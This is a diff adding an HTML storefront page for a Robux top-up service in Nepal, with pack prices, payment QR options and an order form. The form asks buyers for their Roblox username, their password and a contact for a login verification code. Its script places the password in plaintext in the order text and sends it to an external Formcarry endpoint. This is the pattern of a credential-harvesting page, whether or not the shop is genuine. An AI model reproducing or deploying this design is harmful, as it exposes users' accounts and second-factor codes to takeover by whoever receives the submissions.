@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Roblox Robux • SM Digital Services</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0d0f12; --card:#111623; --line:#23283b; --soft:#151b2e;
+    --text:#e9eef4; --muted:#b9c6d3; --accent:#ff2e7a; --gold:#ffd166;
+    --ok:#25D366; --radius:16px;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,sans-serif;line-height:1.55}
+  .wrap{max-width:900px;margin:0 auto;padding:18px}
+  .topbar{display:flex;align-items:center;gap:10px;padding:12px 0}
+  .topbar a{color:#9ecbff;text-decoration:none}
+  .brand-logo{width:40px;height:40px;object-fit:contain;margin-left:auto}
+
+  h1{margin:8px 0 0;font-size:24px;color:var(--accent)}
+  h2{margin:0 0 10px;color:var(--gold)}
+  p{margin:0 0 10px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:18px;margin:14px 0}
+  .note{font-size:14px;color:#ffcdcd}
+
+  input,select{width:100%;padding:12px;border-radius:10px;border:1px solid #2b3148;background:var(--soft);color:#fff;margin:8px 0}
+  input:focus,select:focus{outline:2px solid var(--accent)}
+
+  .pay-row{display:flex;gap:10px;flex-wrap:wrap}
+  .pay-btn{flex:1;min-width:110px;background:var(--soft);border:1px solid #2b3148;border-radius:10px;padding:12px;text-align:center;cursor:pointer;font-weight:700}
+  .pay-btn.active{background:var(--accent);border-color:var(--accent);color:#fff}
+
+  .cta{background:var(--gold);border:none;padding:14px 16px;border-radius:12px;color:#111;font-weight:800;cursor:pointer;width:100%;margin-top:10px}
+  .cta[disabled]{opacity:.5;cursor:not-allowed}
+
+  .footer-links{display:flex;gap:10px;justify-content:center;margin:18px 0 10px}
+  .footer-links a{color:#9ecbff;text-decoration:none}
+
+  #toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);background:#0f1822;border:1px solid rgba(255,255,255,.12);color:#e9eef4;padding:10px 14px;border-radius:10px;box-shadow:0 10px 24px rgba(0,0,0,.28);opacity:0;transition:.25s;z-index:9999}
+  #toast.show{opacity:1}
+
+  /* modal */
+  .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.68);display:none;align-items:center;justify-content:center;padding:18px;z-index:9990}
+  .modal{width:100%;max-width:560px;background:#0f1425;border:1px solid #223259;border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.45)}
+  .modal-head{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #1e2639}
+  .modal-head h3{margin:0;font-size:18px;color:var(--gold)}
+  .modal-close{background:transparent;border:none;color:#cfd6ff;font-size:22px;cursor:pointer}
+  .modal-body{padding:14px 16px}
+  .summary{background:#0b1220;border:1px solid #20263a;border-radius:12px;padding:12px;margin:10px 0;font-size:14px}
+  .summary b{color:var(--gold)}
+  .qr-wrap{text-align:center}
+  .qr-wrap img{max-width:220px;background:#fff;border-radius:12px;padding:8px;display:block;margin:8px auto}
+  @media (max-width:420px){ .qr-wrap img{max-width:160px} }
+  .submit{background:var(--ok);border:none;padding:14px 16px;border-radius:12px;color:#fff;font-weight:800;cursor:pointer;width:100%;margin-top:12px}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="topbar">
+      <a href="index.html">← Back Home</a>
+      <span style="opacity:.6">/</span>
+      <span>Roblox Robux</span>
+      <img class="brand-logo" src="png.images/logo-roblox.png" alt="Roblox">
+    </div>
+
+    <h1>Roblox Robux (Top-Up — Nepal)</h1>
+    <p class="note" style="margin-top:6px">⚡ Delivery in 5–30 minutes • All purchases are <b>non-refundable</b> and <b>non-returnable</b>.</p>
+
+    <!-- Account -->
+    <div class="card">
+      <h2>1) Enter Your Account Data</h2>
+      <input id="username" type="text" placeholder="Roblox Username" required>
+      <input id="pass" type="password" placeholder="Roblox Password" required>
+      <input id="contact" type="text" placeholder="Contact for login code (FB/IG/WhatsApp/Phone)" required>
+      <p class="note">We may need to send a verification code. Please provide a real contact.</p>
+    </div>
+
+    <!-- Packs -->
+    <div class="card">
+      <h2>2) Select the Amount You Want to Buy</h2>
+
+      <h3 style="margin:10px 0 6px;color:#fff">🟦 Basic Packs</h3>
+      <select id="basic">
+        <option value="80 Robux" data-price="190">80 Robux — NPR 190</option>
+        <option value="500 Robux" data-price="1100">500 Robux — NPR 1100</option>
+      </select>
+
+      <h3 style="margin:16px 0 6px;color:#fff">🟦 Premium Packs</h3>
+      <select id="premium">
+        <option value="450 Robux" data-price="975">450 Robux — NPR 975</option>
+        <option value="1,000 Robux" data-price="2095">1,000 Robux — NPR 2,095</option>
+        <option value="2,200 Robux" data-price="4100">2,200 Robux — NPR 4,100</option>
+        <option value="4,500 Robux" data-price="7600">4,500 Robux — NPR 7,600</option>
+        <option value="10,000 Robux" data-price="14500">10,000 Robux — NPR 14,500</option>
+        <option value="22,500 Robux" data-price="29000">22,500 Robux — NPR 29,000</option>
+      </select>
+      <p class="note">Tip: Change either Basic or Premium — whichever you edit last will be used.</p>
+    </div>
+
+    <!-- Payment -->
+    <div class="card">
+      <h2>3) Payment Method</h2>
+      <div class="pay-row">
+        <div class="pay-btn" data-method="eSewa"  data-qr="png.images/logo-esewaqr.png">eSewa</div>
+        <div class="pay-btn" data-method="Khalti" data-qr="png.images/logo-khaltiqr.png">Khalti</div>
+        <div class="pay-btn" data-method="Bank"   data-qr="png.images/logo-bankqr.png">Bank</div>
+      </div>
+      <button id="buyBtn" class="cta" disabled>Buy Now!</button>
+    </div>
+
+    <!-- Important content blocks -->
+    <div class="card">
+      <h2>⚡ About Roblox Top-Up</h2>
+      <p>
+        Roblox is a global platform where millions create and enjoy immersive experiences.
+        Robux is the in-game currency used for premium items, game passes, and subscriptions.
+        With SM Digital Services, you can top up Robux in Nepal via <b>eSewa</b>, <b>Khalti</b>, or
+        <b>Bank transfer</b>—fast, safe, and affordable.
+      </p>
+    </div>
+
+    <div class="card">
+      <h2>✅ Why Choose Our Service?</h2>
+      <ul style="margin:0 0 10px 18px">
+        <li>⚡ <b>Instant Delivery:</b> Robux credited within 5–30 minutes.</li>
+        <li>💰 <b>Affordable Pricing:</b> Local prices starting from NPR 190.</li>
+        <li>🔐 <b>Secure Payments:</b> eSewa, Khalti, or Bank.</li>
+        <li>🎟️ <b>Subs & Gift Cards:</b> We support a wide range of options.</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h2>📝 How to Top Up Robux</h2>
+      <ol style="margin:0 0 10px 18px">
+        <li>Enter your <b>Roblox Username</b>, <b>Password</b>, and a <b>Contact</b> for the login code.</li>
+        <li>Select a <b>Robux package</b> (Basic or Premium).</li>
+        <li>Choose your <b>payment method</b> and click <b>Buy Now</b>.</li>
+        <li>Scan the QR and complete payment.</li>
+        <li>Receive Robux in <b>5–30 minutes</b>.</li>
+      </ol>
+    </div>
+
+    <div class="card">
+      <h2>⚠️ Important Information</h2>
+      <p class="note">
+        • Double-check your Username & Password before submitting. <br>
+        • Do <b>NOT</b> write any gaming words (UC/Robux/Diamond) in remarks — write your <b>real name only</b>.<br>
+        • All purchases are <b>non-refundable & non-returnable</b>.<br>
+        • If verification is needed, we’ll contact you via the method you provided (FB/IG/WhatsApp/Phone).
+      </p>
+    </div>
+
+    <div class="card">
+      <h2>🔎 How to Find Your Roblox Username</h2>
+      <p>
+        Open Roblox and check your profile (top-right menu on PC or mobile). Your
+        Username is shown clearly—use the correct login details to avoid delays.
+      </p>
+    </div>
+
+    <div class="footer-links">
+      <a href="viber://chat?number=+9779828560029">Viber</a>
+      <a href="https://wa.me/9779828560029" target="_blank">WhatsApp</a>
+      <a href="https://tiktok.com/@samirmijar.np" target="_blank">TikTok</a>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+
+  <!-- Modal -->
+  <div id="modal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal">
+      <div class="modal-head">
+        <h3 id="modalTitle">Complete Your Purchase</h3>
+        <button class="modal-close" onclick="closeModal()">×</button>
+      </div>
+      <div class="modal-body">
+        <div class="summary">
+          <div><b>Selected:</b> <span id="mItem">—</span></div>
+          <div><b>Price:</b> <span id="mPrice">—</span></div>
+          <div><b>Username:</b> <span id="mUser">—</span></div>
+          <div><b>Password:</b> <span id="mPass">—</span></div>
+          <div><b>Contact:</b> <span id="mContact">—</span></div>
+          <div><b>Payment:</b> <span id="mMethod">—</span></div>
+        </div>
+
+        <div class="qr-wrap">
+          <h3 style="color:var(--gold)">Scan & Pay</h3>
+          <img id="mQR" alt="Payment QR">
+        </div>
+
+        <p class="note">⚠️ Do NOT write any <b>gaming words</b> in remarks. Only your <b>real name</b>.</p>
+        <input id="txn" type="text" placeholder="Enter Transaction ID or Remarks">
+        <button id="submitBtn" class="submit" onclick="submitNow()">Submit Order</button>
+
+        <!-- Fallback POST to Formcarry if AJAX fails -->
+        <form id="fallbackForm" action="https://formcarry.com/s/l4cLdlMhyf-" method="POST" style="display:none">
+          <input type="hidden" name="name" value="Roblox Customer">
+          <input type="hidden" name="email" value="no-email@order.local">
+          <input type="hidden" name="order" value="">
+        </form>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const FORMCARRY_ENDPOINT = 'https://formcarry.com/s/l4cLdlMhyf-';
+  let chosen={method:'',qr:''}, current={item:'',price:'—'};
+  const $=id=>document.getElementById(id);
+
+  function toast(msg){const t=$('toast');t.textContent=msg;t.classList.add('show');clearTimeout(toast._t);toast._t=setTimeout(()=>t.classList.remove('show'),3000)}
+
+  // track which pack is active (last changed wins)
+  function pick(item,price){current.item=item;current.price=price?`NPR ${price}`:'—';}
+  $('basic').addEventListener('change',e=>{const o=e.target.selectedOptions[0];pick(o.value,o.dataset.price);toggleBuyBtn();});
+  $('premium').addEventListener('change',e=>{const o=e.target.selectedOptions[0];pick(o.value,o.dataset.price);toggleBuyBtn();});
+
+  // payment buttons
+  document.querySelectorAll('.pay-btn').forEach(btn=>{
+    btn.addEventListener('click',()=>{
+      document.querySelectorAll('.pay-btn').forEach(b=>b.classList.remove('active'));
+      btn.classList.add('active');
+      chosen.method=btn.dataset.method; chosen.qr=btn.dataset.qr;
+      toggleBuyBtn();
+    });
+  });
+
+  // enable Buy Now when ready
+  function toggleBuyBtn(){
+    const ok=$('username').value.trim()&&$('pass').value.trim()&&$('contact').value.trim()&&chosen.method&&current.item;
+    $('buyBtn').disabled=!ok;
+  }
+  ['username','pass','contact'].forEach(id=>{
+    $(id).addEventListener('input',toggleBuyBtn);
+    $(id).addEventListener('change',toggleBuyBtn);
+  });
+
+  // open modal
+  $('buyBtn').addEventListener('click',()=>{
+    $('mItem').textContent=current.item||'—';
+    $('mPrice').textContent=current.price||'—';
+    $('mUser').textContent=$('username').value.trim()||'—';
+    $('mPass').textContent=$('pass').value.trim()||'—';
+    $('mContact').textContent=$('contact').value.trim()||'—';
+    $('mMethod').textContent=chosen.method||'—';
+    $('mQR').src=chosen.qr||'';
+    $('modal').style.display='flex';
+  });
+  function closeModal(){ $('modal').style.display='none'; }
+
+  // send to Formcarry
+  async function sendToFormcarry(order){
+    const fd=new FormData();
+    fd.append('name','Roblox Customer');
+    fd.append('email','no-email@order.local');
+    fd.append('order',order);
+    const res=await fetch(FORMCARRY_ENDPOINT,{method:'POST',body:fd,headers:{Accept:'application/json'}});
+    if(!res.ok) throw new Error('Formcarry failed'); return res.json();
+  }
+
+  // final submit
+  async function submitNow(){
+    const user=$('username').value.trim(), pass=$('pass').value.trim(), contact=$('contact').value.trim(), txn=$('txn').value.trim();
+    if(!user||!pass||!contact||!txn){alert('Please fill all required fields.');return;}
+
+    const order=`Roblox Robux Order
+Selected: ${current.item}
+Price: ${current.price}
+Username: ${user}
+Password: ${pass}
+Contact for Code: ${contact}
+Payment: ${chosen.method}
+Transaction/Remarks: ${txn}`;
+
+    const btn=$('submitBtn'); const old=btn.textContent;
+    btn.disabled=true; btn.textContent='Sending...';
+    try{
+      await sendToFormcarry(order);
+      toast('✅ Order sent! We’ll process shortly.');
+      closeModal();
+    }catch(e){
+      const f=$('fallbackForm'); f.elements['order'].value=order; f.submit();
+    }finally{
+      btn.disabled=false; btn.textContent=old;
+    }
+  }
+
+  // close modal UX
+  document.addEventListener('keydown',e=>{if(e.key==='Escape')closeModal();});
+  document.getElementById('modal').addEventListener('click',e=>{if(e.target.id==='modal')closeModal();});
+</script>
+</body>
+</html>
